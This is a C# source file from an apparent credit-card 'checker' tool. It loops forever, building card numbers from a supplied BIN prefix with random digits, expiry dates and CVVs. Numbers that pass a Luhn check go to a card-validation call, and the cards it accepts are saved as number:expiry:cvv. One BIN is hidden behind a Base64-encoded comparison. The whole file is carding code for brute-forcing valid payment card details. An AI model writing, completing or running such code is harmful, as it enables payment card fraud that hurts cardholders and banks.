using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CC_Checker.Threading
{
    public class Tasks
    {

        //https://stackoverflow.com/questions/7134837/how-do-i-decode-a-base64-encoded-string
        public static string DecodeBase64(string value)
        {
            if (string.IsNullOrEmpty(value))
                return string.Empty;
            var valueBytes = Convert.FromBase64String(value);
            return Encoding.UTF8.GetString(valueBytes);
        }

        public static async Task CheckThread(string[] args)
        {
            while (true)
            {
                try
                {
                    string exp_date = "";
                    
                    if (args[2] == DecodeBase64("NDQwMzkz"))
                        exp_date = DateTime.Now.AddMonths(2).ToString("MM") + "/" + DateTime.Now.ToString("yy");
                    else
                        exp_date = Extensions.Extensions.RandomNumber.Value.Next(1, 12)  + "/" + Extensions.Extensions.RandomNumber.Value.Next(22, 26);
                    
                    string cc_num = args[2];

                    string cc_ccv = "";

                    for (int i = 0; i < 10; i++)
                    {
                        cc_num += Extensions.Extensions.RandomNumber.Value.Next(0, 9);
                    }

                    for (int i = 0; i < 3; i++)
                    {
                        cc_ccv += Extensions.Extensions.RandomNumber.Value.Next(0, 9);
                    }

                    if (!string.IsNullOrEmpty(cc_num) && !string.IsNullOrEmpty(cc_ccv))
                    {
                        if (Extensions.Extensions.CheckLuhn(cc_num))
                        {
                            if (await Extensions.Extensions.CheckCard(cc_num, cc_ccv, exp_date))
                            {
                                Extensions.Extensions.WriteCard(cc_num + ":" + exp_date + ":" + cc_ccv);
                                await Task.Delay(TimeSpan.FromSeconds(Convert.ToInt32(args[1])));
                            }
                        }
                    }
                    await Task.Delay(1);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    await Task.Delay(TimeSpan.FromMilliseconds(1));
                }
            }
        }
    }
}
